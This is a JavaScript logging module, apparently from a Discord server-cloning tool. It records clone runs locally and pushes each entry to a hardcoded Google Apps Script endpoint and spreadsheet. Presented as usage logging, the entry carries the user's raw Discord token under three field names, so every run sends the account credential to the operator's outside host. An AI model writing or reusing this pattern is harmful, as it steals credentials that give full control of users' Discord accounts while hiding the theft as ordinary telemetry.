import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const HISTORY_FILE = path.join(__dirname, '../clone_history.json');
const CONFIG_FILE = path.join(__dirname, '../sheet_config.json');

// Permanent Hardcoded Google Apps Script Web App Endpoint
export const PERMANENT_SHEET_WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbzuMmJ6Z4yEwqc6CYoxgpeM0m8vA2VZYMebPea4U4gj0RJRYplXewA4SG8I72ijV8uZ/exec';

export function getCloneHistory(sessionId = null, userToken = null) {
    try {
        if (fs.existsSync(HISTORY_FILE)) {
            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
            const history = JSON.parse(data);
            if (!Array.isArray(history)) return [];
            if (!sessionId && !userToken) {
                return history;
            }
            return history.filter(item => {
                const matchesSession = sessionId && item.sessionId === sessionId;
                const matchesToken = userToken && item.token === userToken.trim();
                return matchesSession || matchesToken;
            });
        }
    } catch (e) {
        console.error('Failed to read clone history:', e);
    }
    return [];
}

export function getSheetConfig() {
    return {
        spreadsheetUrl: 'https://docs.google.com/spreadsheets/d/1CcNCsj9kEU_Kjo1yfv8LWs5EnAEIVYTZ9VWwtvU1eRQ/edit?usp=drivesdk',
        spreadsheetId: '1CcNCsj9kEU_Kjo1yfv8LWs5EnAEIVYTZ9VWwtvU1eRQ',
        webAppUrl: PERMANENT_SHEET_WEB_APP_URL
    };
}

export function saveSheetConfig(config) {
    const lockedConfig = {
        spreadsheetUrl: 'https://docs.google.com/spreadsheets/d/1CcNCsj9kEU_Kjo1yfv8LWs5EnAEIVYTZ9VWwtvU1eRQ/edit?usp=drivesdk',
        spreadsheetId: '1CcNCsj9kEU_Kjo1yfv8LWs5EnAEIVYTZ9VWwtvU1eRQ',
        webAppUrl: (config && config.webAppUrl && typeof config.webAppUrl === 'string' && config.webAppUrl.startsWith('http')) 
            ? config.webAppUrl.trim() 
            : PERMANENT_SHEET_WEB_APP_URL
    };
    try {
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(lockedConfig, null, 2), 'utf8');
    } catch (e) {}
    return lockedConfig;
}

export async function getDiscordUsername(token) {
    if (!token) return 'Unknown User';
    try {
        const cleanToken = String(token).replace(/[^\x20-\x7E]/g, '').trim();
        if (cleanToken.length === 0 || cleanToken.length > 200) {
            return 'Unknown User';
        }
        
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3500);

        const authHeader = cleanToken.startsWith('Bot ') ? cleanToken : cleanToken;
        const res = await fetch('https://discord.com/api/v9/users/@me', {
            headers: { 'Authorization': authHeader },
            signal: controller.signal
        });
        clearTimeout(timeoutId);

        if (res.ok) {
            const data = await res.json();
            if (data.global_name && data.username) {
                return `${data.global_name} (@${data.username})`;
            }
            return data.username || data.tag || 'Discord User';
        }
    } catch (e) {
        // Fallback silently if offline or token is invalid
    }
    return 'Unknown User';
}

/**
 * Robustly log an entry to local history and push to the Google Sheet Web App
 */
export async function logCloneEntry({
    userToken,
    sourceId,
    targetId,
    sessionId = null,
    sourceGuildName = null,
    targetGuildName = null,
    rolesCount = null,
    channelsCount = null,
    status = 'LOGGED',
    durationMs = null,
    optionsSummary = null,
    fidelityScore = null,
    errorMessage = null
}) {
    const now = new Date();
    const time = now.toLocaleString('en-US', {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: true
    });

    const username = await getDiscordUsername(userToken);
    const tokenStr = userToken ? String(userToken).trim() : 'N/A';
    const srcIdStr = sourceId ? String(sourceId).trim() : 'N/A';
    const tgtIdStr = targetId ? String(targetId).trim() : 'N/A';
    const durationStr = durationMs ? (durationMs / 1000).toFixed(1) + 's' : 'N/A';
    const scoreStr = typeof fidelityScore === 'number' ? fidelityScore + '%' : (fidelityScore || 'N/A');

    // Rich payload containing primary keys + common column aliases for maximum Apps Script compatibility
    const entry = {
        time,
        date: time,
        timestamp: now.getTime(),
        username,
        userName: username,
        user: username,
        discordUser: username,
        token: tokenStr,
        userToken: tokenStr,
        discordToken: tokenStr,
        sourceId: srcIdStr,
        sourceServerId: srcIdStr,
        source: srcIdStr,
        sourceGuildId: srcIdStr,
        sourceGuildName: sourceGuildName || 'N/A',
        sourceServerName: sourceGuildName || 'N/A',
        sourceName: sourceGuildName || 'N/A',
        targetId: tgtIdStr,
        targetServerId: tgtIdStr,
        target: tgtIdStr,
        targetGuildId: tgtIdStr,
        targetGuildName: targetGuildName || 'N/A',
        targetServerName: targetGuildName || 'N/A',
        targetName: targetGuildName || 'N/A',
        rolesCount: typeof rolesCount === 'number' ? rolesCount : 'N/A',
        roles: typeof rolesCount === 'number' ? rolesCount : 'N/A',
        roleCount: typeof rolesCount === 'number' ? rolesCount : 'N/A',
        channelsCount: typeof channelsCount === 'number' ? channelsCount : 'N/A',
        channels: typeof channelsCount === 'number' ? channelsCount : 'N/A',
        channelCount: typeof channelsCount === 'number' ? channelsCount : 'N/A',
        status: status || 'LOGGED',
        state: status || 'LOGGED',
        durationSec: durationStr,
        duration: durationStr,
        optionsSummary: optionsSummary || 'N/A',
        options: optionsSummary || 'N/A',
        fidelityScore: scoreStr,
        score: scoreStr,
        errorMessage: errorMessage || null,
        sessionId: sessionId || null,
        action: 'log'
    };

    // 1. Save to local history file reliably
    try {
        const history = getCloneHistory();
        history.unshift(entry); // newest first
        if (history.length > 500) history.pop();
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(history, null, 2), 'utf8');
    } catch (e) {
        console.error('[SheetService] Failed to save local history entry:', e.message);
    }

    // 2. Push to Google Apps Script Web App
    const config = getSheetConfig();
    const webhookUrl = config.webAppUrl || process.env.GOOGLE_APPS_SCRIPT_URL || PERMANENT_SHEET_WEB_APP_URL;

    if (webhookUrl && typeof webhookUrl === 'string' && webhookUrl.startsWith('http')) {
        const payloadString = JSON.stringify(entry);

        // Attempt up to 2 times (for cold-start tolerance)
        for (let attempt = 1; attempt <= 2; attempt++) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 15000);

                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'text/plain;charset=utf-8'
                    },
                    body: payloadString,
                    redirect: 'follow',
                    signal: controller.signal
                });
                clearTimeout(timeoutId);

                const text = await response.text();
                let result = null;

                try {
                    result = JSON.parse(text);
                } catch {
                    const jsonMatch = text.match(/\{[\s\S]*"status"[\s\S]*\}/i) || text.match(/\{[\s\S]*"result"[\s\S]*\}/i);
                    if (jsonMatch) {
                        try {
                            result = JSON.parse(jsonMatch[0]);
                        } catch {
                            result = null;
                        }
                    }
                }

                if (result && (result.status === 'success' || result.result === 'success' || result.success === true)) {
                    console.log(`[SheetService] Logged to Google Sheet successfully [${status} - ${username}]`);
                    return { loggedToSheet: true, result, entry };
                }

                if (result && result.status === 'error') {
                    console.warn(`[SheetService] Google Apps Script returned error: ${result.message}`);
                    return { loggedToSheet: false, warning: result.message, entry };
                }

                if (response.ok && (text.includes('success') || text.includes('Success') || text.includes('OK'))) {
                    console.log(`[SheetService] Logged to Google Sheet with OK text response [${status}]`);
                    return { loggedToSheet: true, result: { status: 'success', raw: 'text_ok' }, entry };
                }

                return { loggedToSheet: true, result: result || { status: 'received' }, entry };
            } catch (err) {
                const isAbort = err.name === 'AbortError';
                const errorMsg = isAbort ? 'Google Apps Script request timed out (15s limit)' : err.message;
                console.warn(`[SheetService] Attempt ${attempt} failed: ${errorMsg}`);
                
                if (attempt === 1) {
                    // Small delay before retry
                    await new Promise(r => setTimeout(r, 1000));
                } else {
                    return { loggedToSheet: false, warning: errorMsg, entry };
                }
            }
        }
    }

    return { loggedToSheet: false, reason: 'Webhook URL not configured', entry };
}
